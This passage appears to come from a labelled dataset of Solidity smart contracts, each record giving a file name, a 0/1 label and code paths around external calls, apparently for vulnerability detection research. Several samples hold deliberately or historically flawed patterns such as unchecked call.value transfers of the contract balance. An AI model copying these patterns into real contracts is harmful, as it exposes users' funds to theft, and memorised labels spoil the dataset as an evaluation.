{ function isAuthorized(address sender, address _contract, bytes data) public view returns (bool); function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool); function validate() public pure returns (bytes4); } contract Authorizable { event SetFsTKAuthority(FsTKAuthority indexed _address); modifier onlyFsTKAuthorized { require(fstkAuthority.isAuthorized(msg.sender, this, msg.data)); _; } modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) { require(fstkAuthority.isApproved(hash, approveTime, approveToken)); _; } FsTKAuthority internal fstkAuthority; constructor(FsTKAuthority _fstkAuthority) internal { fstkAuthority = _fstkAuthority; } function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized { require(_fstkAuthority.validate() == _fstkAuthority.validate.selector); emit SetFsTKAuthority(fstkAuthority = _fstkAuthority); } } contract ERC20 { event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function balanceOf(address owner) public view returns (uint256); function allowance(address owner, address spender) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); } contract SecureERC20 is ERC20 { event SetERC20ApproveChecking(bool approveChecking); function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool); function increaseAllowance(address spender, uint256 value) public returns (bool); function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool); function setERC20ApproveChecking(bool approveChecking) public; } contract FsTKToken { enum DelegateMode { PublicMsgSender, PublicTxOrigin, PrivateMsgSender, PrivateTxOrigin } event Consume(address indexed from, uint256 value, bytes32 challenge); event IncreaseNonce(address indexed from, uint256 nonce); event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info); event TerminateDirectDebit(address indexed debtor, address indexed receiver); event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver); event SetMetadata(string metadata); event SetLiquid(bool liquidity); event SetDelegate(bool isDelegateEnable); event SetDirectDebit(bool isDirectDebitEnable); struct DirectDebitInfo { uint256 amount; uint256 startTime; uint256 interval; } struct DirectDebit { DirectDebitInfo info; uint256 epoch; } struct Instrument { uint256 allowance; DirectDebit directDebit; } struct Account { uint256 balance; uint256 nonce; mapping (address => Instrument) instruments; } function spendableAllowance(address owner, address spender) public view returns (uint256); function transfer(uint256[] data) public returns (bool); function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool); function nonceOf(address owner) public view returns (uint256); function increaseNonce() public returns (bool); function delegateTransferAndCall(uint256 nonce, uint256 fee, uint256 gasAmount, address to, uint256 value, bytes data, DelegateMode mode, uint8 v, bytes32 r, bytes32 s) public returns (bool); function directDebit(address debtor, address receiver) public view returns (DirectDebit); function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool); function terminateDirectDebit(address receiver) public returns (bool); function withdrawDirectDebit(address debtor) public returns (bool); function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool); } contract ERC20Like is SecureERC20, FsTKToken { using AddressExtension for address; using Math for uint256; modifier liquid { require(isLiquid); _; } modifier canUseDirectDebit { require(isDirectDebitEnable); _; } modifier canDelegate { require(isDelegateEnable); _; } bool public erc20ApproveChecking; bool public isLiquid = true; bool public isDelegateEnable; bool public isDirectDebitEnable; string public metadata; mapping(address => Account) internal accounts; constructor(string _metadata) public { metadata = _metadata; } function balanceOf(address owner) public view returns (uint256) { return accounts[owner].balance; } function allowance(address owner, address spender) public view returns (uint256) { return accounts[owner].instruments[spender].allowance; } function transfer(address to, uint256 value) public liquid returns (bool) { Account storage senderAccount = accounts[msg.sender]; senderAccount.balance = senderAccount.balance.sub(value); accounts[to].balance += value; emit Transfer(msg.sender, to, value); return true; } function transferFrom(address from, address to, uint256 value) public liquid returns (bool) { Account storage fromAccount = accounts[from]; Instrument storage senderInstrument = fromAccount.instruments[msg.sender]; fromAccount.balance = fromAccount.balance.sub(value); senderInstrument.allowance = senderInstrument.allowance.sub(value); accounts[to].balance += value; emit Transfer(from, to, value); return true; } function approve(address spender, uint256 value) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; if (erc20ApproveChecking) { require((value == 0) || (spenderInstrument.allowance == 0)); } emit Approval( msg.sender, spender, spenderInstrument.allowance = value ); return true; } function setERC20ApproveChecking(bool approveChecking) public { emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking); } function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; require(spenderInstrument.allowance == expectedValue); emit Approval( msg.sender, spender, spenderInstrument.allowance = newValue ); return true; } function increaseAllowance(address spender, uint256 value) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; emit Approval( msg.sender, spender, spenderInstrument.allowance = spenderInstrument.allowance.add(value) ); return true; } function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; uint256 currentValue = spenderInstrument.allowance; uint256 newValue; if (strict) { newValue = currentValue.sub(value); } else if (value < currentValue) { newValue = currentValue - value; } emit Approval( msg.sender, spender, spenderInstrument.allowance = newValue ); return true; } function setMetadata0(string _metadata) internal { emit SetMetadata(metadata = _metadata); } function setLiquid0(bool liquidity) internal { emit SetLiquid(isLiquid = liquidity); } function setDelegate(bool delegate) public { emit SetDelegate(isDelegateEnable = delegate); } function setDirectDebit(bool directDebit) public { emit SetDirectDebit(isDirectDebitEnable = directDebit); } function spendableAllowance(address owner, address spender) public view returns (uint256) { Account storage ownerAccount = accounts[owner]; return Math.min( ownerAccount.instruments[spender].allowance, ownerAccount.balance ); } function transfer(uint256[] data) public liquid returns (bool) { Account storage senderAccount = accounts[msg.sender]; uint256 totalValue; for (uint256 i = 0; i < data.length; i++) { address receiver = address(data[i] >> 96); uint256 value = data[i] & 0xffffffffffffffffffffffff; totalValue = totalValue.add(value); accounts[receiver].balance += value; emit Transfer(msg.sender, receiver, value); } senderAccount.balance = senderAccount.balance.sub(totalValue); return true; } function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) } require(to.call.value(msg.value)(data)); return true; } function nonceOf(address owner) public view returns (uint256) { return accounts[owner].nonce; } function increaseNonce() public returns (bool) { emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1); } function delegateTransferAndCall(uint256 nonce, uint256 fee, uint256 gasAmount, address to, uint256 value, bytes data, DelegateMode mode, uint8 v, bytes32 r, bytes32 s) public liquid canDelegate returns (bool) { require(to != address(this)); address signer; address relayer; if (mode == DelegateMode.PublicMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PublicTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))), v, r, s ); relayer = tx.origin; } else if (mode == DelegateMode.PrivateMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, msg.sender)), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PrivateTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, tx.origin)), v, r, s ); relayer = tx.origin; } else { revert(); } Account storage signerAccount = accounts[signer]; require(nonce == signerAccount.nonce); emit IncreaseNonce(signer, signerAccount.nonce += 1); signerAccount.balance = signerAccount.balance.sub(value.add(fee)); accounts[to].balance += value; if (fee != 0) { accounts[relayer].balance += fee; emit Transfer(signer, relayer, fee); } if (!to.isAccount() && data.length >= 68) { assembly { mstore(add(data, 36), value) mstore(add(data, 68), signer) } if (to.call.gas(gasAmount)(data)) { emit Transfer(signer, to, value); } else { signerAccount.balance += value; accounts[to].balance -= value; } } else { emit Transfer(signer, to, value); } return true; } function directDebit(address debtor, address receiver) public view returns (DirectDebit) { return accounts[debtor].instruments[receiver].directDebit; } function setupDirectDebit( address receiver, DirectDebitInfo info ) public returns (bool) { accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({ info: info, epoch: 0 }); emit SetupDirectDebit(msg.sender, receiver, info); return true; } function terminateDirectDebit(address receiver) public returns (bool) { delete accounts[msg.sender].instruments[receiver].directDebit; emit TerminateDirectDebit(msg.sender, receiver); return true; } function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) { Account storage debtorAccount = accounts[debtor]; DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit; uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1); uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount); require(amount > 0); debtorAccount.balance = debtorAccount.balance.sub(amount); accounts[msg.sender].balance += amount; debit.epoch = epoch; emit Transfer(debtor, msg.sender, amount); return true; } function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) { Account storage receiverAccount = accounts[msg.sender]; result = true; uint256 total; for (uint256 i = 0; i < debtors.length; i++) { address debtor = debtors[i]; Account storage debtorAccount = accounts[debtor]; DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit; uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1); uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount); require(amount > 0); uint256 debtorBalance = debtorAccount.balance; if (amount > debtorBalance) { if (strict) { revert(); } result = false; emit WithdrawDirectDebitFailure(debtor, msg.sender); } else { debtorAccount.balance = debtorBalance - amount; total += amount; debit.epoch = epoch; emit Transfer(debtor, msg.sender, amount); } } receiverAccount.balance += total; } } contract ServiceVoucher is Authorizable, ERC20Like { uint256 public totalSupply; string public name; string public symbol; uint8 public constant decimals = 0; bool public constant isConsumable = true; constructor( FsTKAuthority _fstkAuthority, string _name, string _symbol, string _metadata ) Authorizable(_fstkAuthority) ERC20Like(_metadata) public { name = _name; symbol = _symbol; } function mint(address to, uint256 value) public liquid onlyFsTKAuthorized returns (bool) { totalSupply = totalSupply.add(value); accounts[to].balance += value; emit Transfer(address(0), to, value); return true; } function consume(address from, uint256 value) public liquid onlyFsTKAuthorized returns (bool) { Account storage fromAccount = accounts[from]; fromAccount.balance = fromAccount.balance.sub(value); totalSupply -= value; emit Consume(from, value, bytes32(0)); emit Transfer(from, address(0), value); return true; } function delegateConsume( uint256 nonce, uint256 fee, uint256 value, bytes32 challenge, DelegateMode mode, uint8 v, bytes32 r, bytes32 s ) public liquid canDelegate returns (bool) { require(value > 0); address signer; address relayer; if (mode == DelegateMode.PublicMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, address(0))), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PublicTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, address(0))), v, r, s ); relayer = tx.origin; } else if (mode == DelegateMode.PrivateMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, msg.sender)), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PrivateTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, tx.origin)), v, r, s ); relayer = tx.origin; } else { revert(); } Account storage signerAccount = accounts[signer]; require(nonce == signerAccount.nonce); emit IncreaseNonce(signer, signerAccount.nonce += 1); signerAccount.balance = signerAccount.balance.sub(value.add(fee)); totalSupply -= value; emit Consume(signer, value, challenge); emit Transfer(signer, address(0), value); if (fee != 0) { accounts[relayer].balance += fee; emit Transfer(signer, relayer, fee); } return true; } function setMetadata(string infoUrl) public onlyFsTKAuthorized { setMetadata0(infoUrl); } function setLiquid(bool liquidity) public onlyFsTKAuthorized { setLiquid0(liquidity); } function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized { super.setERC20ApproveChecking(approveChecking); } function setDelegate(bool delegate) public onlyFsTKAuthorized { super.setDelegate(delegate); } function setDirectDebit(bool directDebit) public onlyFsTKAuthorized { super.setDirectDebit(directDebit); } function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized { erc20.transfer(to, value); } } "}
{"sol name": "21697_1.sol", "label": 1, "first path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "second path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "third path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "long path": "pragma solidity ^0.4.19; contract SPRING_BOARD_1_ETH { address owner = msg.sender; function() public payable {} function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); } } function Kill()    public    payable    { if(msg.sender==owner)        { selfdestruct(owner); } } } "}
{"sol name": "24007_1.sol", "label": 1, "first path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "second path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "third path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "long path": "pragma solidity ^0.4.19; contract GetSomeEther { address creator = msg.sender; uint256 public LastExtractTime; mapping (address=>uint256) public ExtractDepositTime; uint256 public freeEther; function Deposit() public payable { if(msg.value> 0.2 ether && freeEther >= 0.2 ether) { LastExtractTime = now + 2 days; ExtractDepositTime[msg.sender] = LastExtractTime; freeEther-=0.2 ether; } } function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; } } function PutEther() public payable { uint256 newVal = freeEther+msg.value; if(newVal>freeEther)freeEther=newVal; } function Kill() public payable  { if(msg.sender==creator && now>LastExtractTime + 2 days) { selfdestruct(creator); } else revert(); } function() public payable{} } "}
{"sol name": "23803_1.sol", "label": 0, "first path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "second path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "third path": "function () payable { if (!founder.call.value(msg.value)()) revert(); ", "long path": "pragma solidity ^0.4.11; contract TRUEToken  { string public constant name = \"TRUE Token\"; string public constant symbol = \"TRUE\"; uint public constant decimals = 18; uint256 _totalSupply    = 100000000 * 10**decimals; function totalSupply() constant returns (uint256 supply) { return _totalSupply; } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping(address => uint256) balances; mapping(address => mapping (address => uint256)) allowed; uint public baseStartTime; address public founder = 0x0; uint256 public distributed = 0; event AllocateFounderTokens(address indexed sender); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); function TRUEToken(address _founder) { founder = _founder; } function setStartTime(uint _startTime) { if (msg.sender!=founder) revert(); baseStartTime = _startTime; } function distribute(uint256 _amount, address _to) { if (msg.sender!=founder) revert(); if (distributed + _amount > _totalSupply) revert(); distributed += _amount; balances[_to] += _amount; Transfer(this, _to, _amount); } function transfer(address _to, uint256 _value) returns (bool success) { if (now < baseStartTime) revert(); if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function changeFounder(address newFounder) { if (msg.sender!=founder) revert(); founder = newFounder; } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (msg.sender != founder) revert(); if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function () payable { if (!founder.call.value(msg.value)()) revert(); } function kill() { if (msg.sender == founder) { suicide(founder); } } } "}
{"sol name": "39326_1.sol", "label": 0, "first path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "second path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "third path": "function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; ProposalTallied(id, p.numberOfVotes, p.proposalPassed); library CreatorCongress { ", "long path": "pragma solidity ^0.4.4; contract Owned { address public owner; function setOwner(address _owner) onlyOwner { owner = _owner; } modifier onlyOwner { if (msg.sender != owner) throw; _; } } contract Destroyable { address public hammer; function setHammer(address _hammer) onlyHammer { hammer = _hammer; } function destroy() onlyHammer { suicide(msg.sender); } modifier onlyHammer { if (msg.sender != hammer) throw; _; } } contract Object is Owned, Destroyable { function Object() { owner  = msg.sender; hammer = msg.sender; } } contract ERC20 { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256); function transfer(address _to, uint256 _value) returns (bool); function transferFrom(address _from, address _to, uint256 _value) returns (bool); function approve(address _spender, uint256 _value) returns (bool); function allowance(address _owner, address _spender) constant returns (uint256); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract Recipient { event ReceivedEther(address indexed sender, uint256 indexed amount); event ReceivedTokens(address indexed from, uint256 indexed value, address indexed token, bytes extraData); function receiveApproval(address _from, uint256 _value, ERC20 _token, bytes _extraData) { if (!_token.transferFrom(_from, this, _value)) throw; ReceivedTokens(_from, _value, _token, _extraData); } function () payable { ReceivedEther(msg.sender, msg.value); } } contract Congress is Object, Recipient { uint256 public minimumQuorum; uint256 public debatingPeriodInMinutes; int256 public majorityMargin; Proposal[] public proposals; function numProposals() constant returns (uint256) { return proposals.length; } Member[] public members; mapping(address => uint256) public memberId; event ProposalAdded(uint256 indexed proposal, address indexed recipient, uint256 indexed amount, string description); event Voted(uint256 indexed proposal, bool    indexed position, address indexed voter, string justification); event ProposalTallied(uint256 indexed proposal, uint256 indexed quorum, bool    indexed active); event MembershipChanged(address indexed member, bool    indexed isMember); event ChangeOfRules(uint256 indexed minimumQuorum, uint256 indexed debatingPeriodInMinutes, int256  indexed majorityMargin); struct Proposal { address recipient; uint256 amount; string  description; uint256 votingDeadline; bool    executed; bool    proposalPassed; uint256 numberOfVotes; int256  currentResult; bytes32 proposalHash; Vote[]  votes; mapping(address => bool) voted; } struct Member { address member; string  name; uint256 memberSince; } struct Vote { bool    inSupport; address voter; string  justification; } modifier onlyMembers { if (memberId[msg.sender] == 0) throw; _; } function Congress( uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256  marginOfVotesForMajority, address congressLeader ) { changeVotingRules(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority); addMember(0, ''); if (congressLeader != 0) addMember(congressLeader, 'The Founder'); } function addMember(address targetMember, string memberName) onlyOwner { if (memberId[targetMember] != 0) throw; memberId[targetMember] = members.length; members.push(Member({member:      targetMember, memberSince: now, name:        memberName})); MembershipChanged(targetMember, true); } function removeMember(address targetMember) onlyOwner { if (memberId[targetMember] == 0) throw; uint256 targetId = memberId[targetMember]; uint256 lastId   = members.length - 1; Member memory moved    = members[lastId]; members[targetId]      = moved; memberId[moved.member] = targetId; memberId[targetMember] = 0; delete members[lastId]; --members.length; MembershipChanged(targetMember, false); } function changeVotingRules( uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256  marginOfVotesForMajority ) onlyOwner { minimumQuorum           = minimumQuorumForProposals; debatingPeriodInMinutes = minutesForDebate; majorityMargin          = marginOfVotesForMajority; ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, majorityMargin); } function newProposal( address beneficiary, uint256 amount, string  jobDescription, bytes   transactionBytecode ) onlyMembers returns (uint256 id) { id               = proposals.length++; Proposal p       = proposals[id]; p.recipient      = beneficiary; p.amount         = amount; p.description    = jobDescription; p.proposalHash   = sha3(beneficiary, amount, transactionBytecode); p.votingDeadline = now + debatingPeriodInMinutes * 1 minutes; p.executed       = false; p.proposalPassed = false; p.numberOfVotes  = 0; ProposalAdded(id, beneficiary, amount, jobDescription); } function checkProposalCode( uint256 id, address beneficiary, uint256 amount, bytes   transactionBytecode ) constant returns (bool codeChecksOut) { return proposals[id].proposalHash == sha3(beneficiary, amount, transactionBytecode); } function vote( uint256 id, bool    supportsProposal, string  justificationText ) onlyMembers returns (uint256 vote) { Proposal p = proposals[id]; if (p.voted[msg.sender] == true) throw; p.voted[msg.sender] = true; p.numberOfVotes++; if (supportsProposal) { p.currentResult++; } else { p.currentResult--; } Voted(id,  supportsProposal, msg.sender, justificationText); } function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers { Proposal p = proposals[id]; if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw; if (p.currentResult > majorityMargin) { p.executed = true; if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw; p.proposalPassed = true; } else { p.proposalPassed = false; } ProposalTallied(id, p.numberOfVotes, p.proposalPassed); } } library CreatorCongress { function create(uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256 marginOfVotesForMajority, address congressLeader) returns (Congress) { return new Congress(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority, congressLeader); } function version() constant returns (string) { return \"v0.6.3\"; } function abi() constant returns (string) { return '[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"proposals\",\"outputs\":[{\"name\":\"recipient\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"description\",\"type\":\"string\"},{\"name\":\"votingDeadline\",\"type\":\"uint256\"},{\"name\":\"executed\",\"type\":\"bool\"},{\"name\":\"proposalPassed\",\"type\":\"bool\"},{\"name\":\"numberOfVotes\",\"type\":\"uint256\"},{\"name\":\"currentResult\",\"type\":\"int256\"},{\"name\":\"proposalHash\",\"type\":\"bytes32\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetMember\",\"type\":\"address\"}],\"name\":\"removeMember\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"executeProposal\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"memberId\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"numProposals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hammer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"members\",\"outputs\":[{\"name\":\"member\",\"type\":\"address\"},{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"memberSince\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"debatingPeriodInMinutes\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minimumQuorum\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"},{\"name\":\"_token\",\"type\":\"address\"},{\"name\":\"_extraData\",\"type\":\"bytes\"}],\"name\":\"receiveApproval\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"majorityMargin\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"beneficiary\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"jobDescription\",\"type\":\"string\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"newProposal\",\"outputs\":[{\"name\":\"id\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"minimumQuorumForProposals\",\"type\":\"uint256\"},{\"name\":\"minutesForDebate\",\"type\":\"uint256\"},{\"name\":\"marginOfVotesForMajority\",\"type\":\"int256\"}],\"name\":\"changeVotingRules\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetMember\",\"type\":\"address\"},{\"name\":\"memberName\",\"type\":\"string\"}],\"name\":\"addMember\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_hammer\",\"type\":\"address\"}],\"name\":\"setHammer\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"supportsProposal\",\"type\":\"bool\"},{\"name\":\"justificationText\",\"type\":\"string\"}],\"name\":\"vote\",\"outputs\":[{\"name\":\"vote\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"beneficiary\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"transactionBytecode\",\"type\":\"bytes\"}],\"name\":\"checkProposalCode\",\"outputs\":[{\"name\":\"codeChecksOut\",\"type\":\"bool\"}],\"payable\":false,\"type\":\"function\"},{\"inputs\":[{\"name\":\"minimumQuorumForProposals\",\"type\":\"uint256\"},{\"name\":\"minutesForDebate\",\"type\":\"uint256\"},{\"name\":\"marginOfVotesForMajority\",\"type\":\"int256\"},{\"name\":\"congressLeader\",\"type\":\"address\"}],\"payable\":false,\"type\":\"constructor\"},{\"payable\":true,\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"description\",\"type\":\"string\"}],\"name\":\"ProposalAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"position\",\"type\":\"bool\"},{\"indexed\":true,\"name\":\"voter\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"justification\",\"type\":\"string\"}],\"name\":\"Voted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"quorum\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"ProposalTallied\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"member\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"isMember\",\"type\":\"bool\"}],\"name\":\"MembershipChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"minimumQuorum\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"debatingPeriodInMinutes\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"majorityMargin\",\"type\":\"int256\"}],\"name\":\"ChangeOfRules\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ReceivedEther\",\